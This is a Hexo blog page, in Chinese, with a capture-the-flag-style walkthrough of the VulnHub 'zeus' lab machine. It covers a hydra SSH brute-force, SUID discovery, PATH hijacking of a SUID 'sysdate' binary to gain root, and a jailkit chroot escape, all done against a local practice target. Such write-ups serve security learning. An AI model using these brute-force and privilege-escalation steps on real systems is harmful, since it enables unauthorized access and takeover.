@@ -1,0 +1,89 @@
+<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="vulnhub-zeus"><meta name="keywords" content="靶场,vulnhub"><meta name="author" content="东雲"><meta name="copyright" content="东雲"><title>vulnhub-zeus | 东雲研究所</title><link rel="shortcut icon" href="/melody-favicon.png"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  hexoVersion: '6.2.0'
+} </script><meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="东雲研究所" type="application/atom+xml">
+</head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="false"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8E%A2%E6%B5%8B-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">探测-信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83-%E8%B6%8A%E7%8B%B1"><span class="toc-number">3.</span> <span class="toc-text">提权-越狱</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">总结</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">东雲</div><div class="author-info__description text-center">想学渗透的学生一枚</div><div class="follow-button"><a target="_blank" rel="noopener" href="https://github.com/ElectQ">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">6</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">6</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">分类</span><span class="pull-right">3</span></a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://w.wallhaven.cc/full/1k/wallhaven-1keo6g.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">东雲研究所</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">首页</a><a class="site-page" href="/archives">时间轴</a><a class="site-page" href="/tags">标签</a><a class="site-page" href="/categories">分类</a><a class="site-page" href="/about">关于</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">vulnhub-zeus</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-06-03</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/">渗透学习</a></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这台靶机就是静态ip，我把kali的网卡绑定成和他一样才能联通</p>
+<span id="more"></span>
+
+<h2 id="探测-信息收集"><a href="#探测-信息收集" class="headerlink" title="探测-信息收集"></a>探测-信息收集</h2><p>端口扫描</p>
+<p>访问80端口，主页面没有什么可以利用的信息</p>
+<p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220416231223424.png" alt="image-20220416231223424"></p>
+<p>网站目录扫描</p>
+<p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220416225957484.png" alt="image-20220416225957484"></p>
+<p><a target="_blank" rel="noopener" href="http://192.168.131.170/assets/">http://192.168.131.170/assets/</a> 一些网站的前端配置文件，没有什么有效的信息</p>
+<p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220416230026418.png" alt="image-20220416230026418"></p>
+<p><a target="_blank" rel="noopener" href="http://192.168.131.170/backups/">http://192.168.131.170/backups/</a> 备份目录没有啥</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.131.170/telecom/">http://192.168.131.170/telecom/</a> 源码里藏着信息</p>
+<blockquote>
+<p>the website will be updated by gogu</p>
+</blockquote>
+<p>其实到这里我一直在怀疑为啥ftp端口没啥信息呢</p>
+<p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220416230735002.png" alt="image-20220416230735002"></p>
+<p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220416231105312.png" alt="image-20220416231105312"></p>
+<p>最终只能去爆破密码了，跑到吐血</p>
+<p>hydra -l gogu -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt 192.168.131.170 ssh</p>
+<p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220416231206190.png" alt="image-20220416231206190"></p>
+<blockquote>
+<p>得到密码 universal </p>
+</blockquote>
+<h2 id="提权-越狱"><a href="#提权-越狱" class="headerlink" title="提权-越狱"></a>提权-越狱</h2><p>ssh <a href="mailto:&#x67;&#x6f;&#103;&#x75;&#x40;&#x31;&#57;&#x32;&#46;&#x31;&#x36;&#x38;&#46;&#x31;&#x33;&#49;&#x2e;&#x31;&#55;&#x30;">&#x67;&#x6f;&#103;&#x75;&#x40;&#x31;&#57;&#x32;&#46;&#x31;&#x36;&#x38;&#46;&#x31;&#x33;&#49;&#x2e;&#x31;&#55;&#x30;</a></p>
+<p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220416231509302.png" alt="image-20220416231509302"></p>
+<p>md5解密</p>
+<p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220416233616578.png"></p>
+<p>信息收集</p>
+<p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220416231959222.png" alt="image-20220416231959222"></p>
+<p>尝试suid提权</p>
+<p>find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null </p>
+<p>没有找到啥东西</p>
+<p>这里发现了linux装了jailkit</p>
+<p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220416233959094.png" alt="image-20220416233959094"></p>
+<p>难怪之前的用户命令好多用不了</p>
+<blockquote>
+<p>jailkit 是一款能够在一个chroot jail中快速创建受限用户帐户的工具集。它包含了一个安全日志守护进程，shells可以限制用户，开启和设置chroot jail守护进程的工具。</p>
+</blockquote>
+<p>寻找可以逃避这个准则的文件&#x2F;目录</p>
+<p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220416234929096.png" alt="image-20220416234929096"></p>
+<p>看到个神奇的目录 …</p>
+<p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220416235021523.png" alt="image-20220416235021523"></p>
+<p>sysdate是个有suid权限的文件，是个和日期有关的文件,但是查看是个乱码，可能是靶机上没有程序能查看它</p>
+<p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220416235239648.png" alt="image-20220416235239648"></p>
+<p>下到kali上查看,这是个二进制文件</p>
+<p>ssh <a href="mailto:&#x72;&#x6f;&#111;&#116;&#x40;&#49;&#x39;&#50;&#x2e;&#x31;&#54;&#56;&#46;&#49;&#x33;&#x31;&#x2e;&#49;&#x32;&#56;">&#x72;&#x6f;&#111;&#116;&#x40;&#49;&#x39;&#50;&#x2e;&#x31;&#54;&#56;&#46;&#49;&#x33;&#x31;&#x2e;&#49;&#x32;&#56;</a> “cat &gt; sysdate” &lt; &#x2F;home&#x2F;gogu&#x2F;…&#x2F;sysdate</p>
+<p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220416235957274.png" alt="image-20220416235957274"></p>
+<p>日期”命令是以其相对“路径”执行的，即使用PATH环境变量中包含的路径</p>
+<p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220417000226232.png" alt="image-20220417000226232"></p>
+<p>此处的操作可以通过更改此用户的本地 $PATH 变量并将“sysdate”重定向到我们可以控制的另一个二进制文件来完成，也就是说，不是在“&#x2F;bin&#x2F;date”中执行，而是执行“&#x2F;path&#x2F;date” -可操纵”</p>
+<p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220417001118473.png" alt="image-20220417001118473"></p>
+<p>这样相当于在文件里得到一个交互性shell(不过回显还是需要添加 1&lt;&amp;2)</p>
+<p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220417001400285.png" alt="image-20220417001400285"></p>
+<p>虽然我们获得了 root 权限，但我们仍然被困在“Jail Shell”中,并非真正的root，需要越狱 </p>
+<p>两种方法可以参考 <a target="_blank" rel="noopener" href="https://filippo.io/">https://filippo.io/</a></p>
+<p>将编译好的c文件传到靶机上去</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh gogu@192.168.131.170 &quot;cat &gt; unchroot&quot; &lt; unchroot</span><br><span class="line"></span><br><span class="line">chmod 777 unchroot</span><br></pre></td></tr></table></figure>
+
+<p>这里和之前一样执行data文件时候会执行unchroot文件</p>
+<p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220417003932844.png" alt="image-20220417003932844"></p>
+<p>执行suid文件</p>
+<p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220417004249431.png" alt="image-20220417004249431"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat root.txt 1&lt;&amp;2</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220417004423898.png" alt="image-20220417004423898"></p>
+<p>优化你的shell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot; 1&lt;&amp;2</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ph-1307623205.cos.ap-nanjing.myqcloud.com/img/image-20220417004555404.png" alt="image-20220417004555404"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1.强行爆破是真的没有想到，一直以为backup下面还有信息</p>
+<p>2.linux的越狱，还是通过修改输出路径使得suid文件来侧面执行我们想要执行的文件</p>
+<p>3.ssh传递文件的方式  ssh <a href="mailto:&#x78;&#x78;&#x40;&#49;&#57;&#50;&#46;&#49;&#x36;&#56;&#46;&#49;&#x33;&#49;&#x2e;&#x31;&#x37;&#x30;">&#x78;&#x78;&#x40;&#49;&#57;&#50;&#46;&#49;&#x36;&#56;&#46;&#49;&#x33;&#49;&#x2e;&#x31;&#x37;&#x30;</a> “cat &gt; cc” &lt; &#x2F;xx&#x2F;xx&#x2F;cc</p>
+</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">东雲</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://electq.github.io/2022/06/03/vulnhub-zeus/">http://electq.github.io/2022/06/03/vulnhub-zeus/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://ElectQ.github.io">东雲研究所</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E9%9D%B6%E5%9C%BA/">靶场</a><a class="post-meta__tags" href="/tags/vulnhub/">vulnhub</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2022/06/03/%E6%B8%97%E9%80%8F%E7%BA%A2%E9%98%9F%E9%9D%B6%E5%9C%BA2-0/"><i class="fa fa-chevron-left">  </i><span>渗透红队靶场2.0</span></a></div><div class="next-post pull-right"><a href="/2022/06/02/soeasy/"><span>soeasy</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://w.wallhaven.cc/full/1k/wallhaven-1keo6g.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2022 By 东雲</div><div class="framework-info"><span>驱动 - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
+  $('#nav').addClass('is-mobile')
+  $('footer').addClass('is-mobile')
+  $('#top-container').addClass('is-mobile')
+}</script></body></html>
